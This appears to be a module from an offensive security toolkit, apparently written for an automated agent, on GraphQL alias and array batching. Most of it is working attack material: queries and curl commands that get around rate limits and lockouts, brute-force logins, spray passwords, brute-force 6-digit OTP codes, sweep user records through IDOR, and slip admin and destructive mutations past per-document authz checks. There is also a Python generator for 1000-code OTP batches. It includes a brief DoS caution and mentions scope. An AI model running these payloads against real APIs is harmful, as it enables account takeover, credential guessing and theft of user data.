# Batching and aliasing — multiplying requests inside one POST

GraphQL gives three ways to run N operations per HTTP request — **aliases**,
**array batching**, and **multi-root documents**. All three multiply your
probe budget; two of them bypass rate limits and one bypasses naive per-field
authz timing. They are force multipliers for every other module here.

---

## 1. Aliases — N field calls in one document

GraphQL `alias: field(args)` lets the same field run many times in a single
query:

```graphql
{
  a1: user(id:1){ username email }
  a2: user(id:2){ username email }
  a3: user(id:3){ username email }
  a4: user(id:4){ username email }
  a5: user(id:5){ username email }
}
```

Response:

```json
{"data":{"a1":{...},"a2":{...},"a3":{...},"a4":{...},"a5":{...}}}
```

**What it buys:**

- **IDOR sweeps** — enumerate ids at full field granularity without per-request
  cost ceilings. 100 aliases = 100 ids per POST.
- **Rate-limit bypass** — limits counted per HTTP request see one request.
- **Auth-timing bypass** — a middleware that checks authz once per *document*
  evaluates it once; resolvers run N times inside.
- **Brute force** — password/PIN/token guessing in bulk:

```graphql
mutation{
  t1: login(user:"admin", pass:"123456"){ token }
  t2: login(user:"admin", pass:"password"){ token }
  t3: login(user:"admin", pass:"qwerty"){ token }
  t4: login(user:"admin", pass:"letmein"){ token }
}
```

Each `tN` returns independently — one 200 response carries four auth attempts.
A login-attempt limiter counting requests sees 1.

- **Race without threads** — some engines resolve same-document fields
  serially in order; overlapping mutations inside one document get a
  deterministic mini-pipeline (limited but real for TOCTOU setups where the
  check runs per-field — see `skills/web-race-condition/`).

**Limits**: depth/alias counters exist (graphql-armor, apollo plugins cap
alias count). If rejected for `Alias limit exceeded`, lower the count — the
*cap* is defence, not a sign aliasing is off. Servers without limits have been
observed answering 1000-alias documents.

## 2. Array batching — a JSON array of full documents

Many servers (express-graphql, Apollo ≤3, graphql-yoga, Hasura off-by-default)
accept a top-level JSON array — each element is an independent operation:

```bash
curl -s "$BASE/graphql" -H 'Content-Type: application/json' -d '[
  {"query":"{user(id:1){email}}"},
  {"query":"{user(id:2){email}}"},
  {"query":"mutation{login(user:\"a\",pass:\"x\"){token}}"},
  {"query":"{__schema{types{name}}}"}
]'
```

Response is an array aligned by index: `[{...},{...},{...},{...}]`.

**What it buys over aliases:**

- Each element is a separate *operation* — different operation types mix
  (query + mutation + subscription attempt).
- Per-document cost limits apply per element; a rejected element doesn't kill
  the batch (partial results still return).
- Validation errors in element 2 don't fail elements 1 and 3.
- Some WAFs parse only element[0] — the rest fly under inspection.

**Detection**: if `[{"query":"{__typename}"}]` returns an array — batching is
on. If it errors `Must be a single object`, batching is off — record the
negative; aliases usually still work.

## 3. Multi-root documents — unnamed extra operations

```graphql
{ a: __typename }
{ b: user(id:1){id} }
```

Multiple anonymous root docs in one payload — spec says exactly one
anonymous operation per document; lax parsers execute them all or the last.
Low-value except for parser-differential probing (`type-confusion.md`).

## 4. The rate-limit / lockout bypass pattern

Scenario: `login` mutation locked after 5 attempts *per HTTP request log*.

```graphql
mutation{
  a1:login(u:"admin",p:"pass1"){ok}
  a2:login(u:"admin",p:"pass2"){ok}
  ... a50:login(u:"admin",p:"pass50"){ok}
}
```

50 tries, 1 HTTP request. If per-account lockout is *also* enforced at the
resolver (correct), this fails — but per-request counting is the common bug.
Pair with `batching` when the lockout is per-operation-name — array elements
can each carry a different `operationName`.

**Password-spray variant** — spray across users in one doc:

```graphql
mutation{
  u1:login(u:"alice",p:"Spring2024!"){ok}
  u2:login(u:"bob",p:"Spring2024!"){ok}
  u3:login(u:"carol",p:"Spring2024!"){ok}
}
```

One password across N accounts evades per-account lockouts — classic spray.

## 5. OTP / token brute force

```graphql
mutation{
  o1: verifyOtp(code:"000001"){valid}
  o2: verifyOtp(code:"000002"){valid}
  ...
}
```

For a 6-digit OTP you need the server to accept ~1000-alias docs — most do
not cap. Split across array batching for more headroom:

```bash
python3 - <<'EOF'
import json
batch=[{"query":f'mutation{{o:verifyOtp(code:"{i:06d}"){{valid}}}}'} for i in range(1000)]
open('/tmp/batch.json','w').write(json.dumps(batch))
EOF
curl -s "$BASE/graphql" -H 'Content-Type: application/json' -d @/tmp/batch.json
```

## 6. Authz-timing via batching — the check-once bug

A frequent middleware shape: `authMiddleware` validates the *document* once —
it inspects the first root field and decides. Batch a benign first element
with hostile followers:

```json
[
  {"query":"{publicInfo}"},
  {"query":"{adminPanel{secrets}}"},
  {"query":"mutation{deleteAll}"}
]
```

When authz is per-document-not-per-resolver, elements 2+ run with element 1's
trust. Similarly for alias-shaped docs where the middleware parses the first
field only. See `authz-bypass.md` §middleware-order.

## 7. Cost and depth evasion

Depth limiters count nesting depth, not breadth:

```graphql
# depth=1, width=200 — passes a depth=5 limit trivially
{ a1:u(id:1){e} a2:u(id:2){e} ... a200:u(id:200){e} }
```

So horizontal fans evade depth caps but still deliver mass reads. When a
*cost* limiter assigns per-field scores, aliases multiply cost too — a
cost-limited server rejects wide docs as well; that rejection is a **cost
signal**, not a defence confirmation.

## 8. DoS-adjacent caution

Circular queries (`user{friends{friends{friends...}}}`) and million-alias
docs are DoS surfaces — the toolkit's rules apply: read-only oracle beats
write, and destructive/load payloads need explicit scope. A *bounded* depth
probe (10 levels) to test for depth limiting is legitimate; do not send
amplifying queries to shared instances. The finding is "no depth limit"
(provable at depth 8-12), not the crash.

## 9. Recipe: 100-alias IDOR pull

```python
import json
fields = "  ".join(f'a{i}:user(id:{i}){{id username email role}}'
                   for i in range(1,101))
doc = {"query":"{ "+fields+" }"}
print(json.dumps(doc))
```

```bash
python3 gen.py > /tmp/sweep.json
curl -s "$BASE/graphql" -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" -d @/tmp/sweep.json | jq '.data | to_entries[] | .value'
```

Each returned `user` object is verbatim evidence; the whole response body is
`--response` material. Record the alias sweep capability:

```bash
python3 tools/state.py $CHAL --hypothesis \
  "aliased batch returns N ids per request — sweep-capable"
```
